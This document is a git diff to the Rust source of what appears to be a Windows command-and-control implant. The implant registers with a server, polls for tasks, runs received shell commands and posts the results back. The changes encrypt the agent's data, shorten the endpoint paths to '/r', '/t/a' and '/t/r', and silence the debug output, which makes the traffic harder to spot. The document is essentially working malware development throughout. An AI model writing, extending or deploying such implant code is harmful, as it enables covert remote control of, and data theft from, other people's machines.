@@ -6,7 +6,7 @@ use windows::core::{Error, HSTRING};
 
 use crate::{
     core::{
-        agents::AgentData,
+        agents::{AgentData, enc_agentdata},
         handlers::win::{
             async_handler::HRequestAsync,
             handler::{HConnect, HInternet, HRequest, HSession},
@@ -18,7 +18,7 @@ use crate::{
         },
     },
     Config,
-    crypto::aesgcm::{encrypt, decrypt, encode, decode},
+    crypto::aesgcm::{decode_decrypt, encrypt_encode},
     utils::random::random_name,
 };
 
@@ -56,7 +56,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
         config.key.to_string(),
         config.nonce.to_string()
     );
-    let ra_json = serde_json::to_string(&ra).unwrap();
+    let ra_json = serde_json::to_string(&enc_agentdata(ra.clone())).unwrap();
 
     // Agent registration process
     let mut registered = false;
@@ -64,18 +64,22 @@ pub async fn run(config: Config) -> Result<(), Error> {
         thread::sleep(sleep);
     
         // Register agent
-        let response = match post(&mut hconnect, "/reg".to_owned(), ra_json.to_string()).await {
+        let response = match post(&mut hconnect, "/r".to_owned(), ra_json.to_string()).await {
             Ok(resp) => {
                 registered = true;
-                let decoded = decode(resp.as_bytes());
-                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
-                String::from_utf8(decrypted).unwrap()
+                String::from_utf8(
+                    decode_decrypt(
+                        resp.as_bytes(),
+                        config.key.as_bytes(),
+                        config.nonce.as_bytes()
+                    )).unwrap()
             }
             Err(e) => {
                 continue;
             }
         };
-        println!("{}", response);
+
+        // println!("{}", response);
     }
 
     loop {
@@ -84,14 +88,17 @@ pub async fn run(config: Config) -> Result<(), Error> {
         thread::sleep(sleep);
 
         // Get task
-        let task = match post(&mut hconnect, "/task/ask".to_owned(), ra_json.to_string()).await {
+        let task = match post(&mut hconnect, "/t/a".to_owned(), ra_json.to_string()).await {
             Ok(resp) => {
-                let decoded = decode(resp.as_bytes());
-                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
-                String::from_utf8(decrypted).unwrap()
+                String::from_utf8(
+                    decode_decrypt(
+                        resp.as_bytes(),
+                        config.key.as_bytes(),
+                        config.nonce.as_bytes()
+                    )).unwrap()
             },
             Err(e) => {
-                println!("Error fetching /task/ask: {:?}", e);
+                // println!("Error fetching /t/a: {:?}", e);
                 continue;
             }
         };
@@ -119,8 +126,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         ra.task_result = Some(e.to_string().as_bytes().to_vec());
                     }
                 }
-                let ra_json = serde_json::to_string(&ra).unwrap();
-                post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
+                let ra_json = serde_json::to_string(&enc_agentdata(ra.clone())).unwrap();
+                post(&mut hconnect, "/t/r".to_owned(), ra_json.to_string()).await;
             }
             "shell" => {
                 // Execute shell command
@@ -132,8 +139,8 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         ra.task_result = Some(e.to_string().as_bytes().to_vec());
                     }
                 }
-                let ra_json = serde_json::to_string(&ra).unwrap();
-                post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
+                let ra_json = serde_json::to_string(&enc_agentdata(ra.clone())).unwrap();
+                post(&mut hconnect, "/t/r".to_owned(), ra_json.to_string()).await;
             }
             _ => {
                 continue;
@@ -194,7 +201,13 @@ async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error>
     Ok(response)
 }
 
-async fn post(hconnect: &mut HConnect, url_path: String, data: String) -> Result<String, Error> {    
+async fn post(
+    hconnect: &mut HConnect,
+    url_path: String,
+    data: String
+) -> Result<String, Error> {
+    // TODO: Encrypt and encode the post data
+
     let hrequest = HRequest::new(
         hconnect,
         HSTRING::from("POST".to_string()),
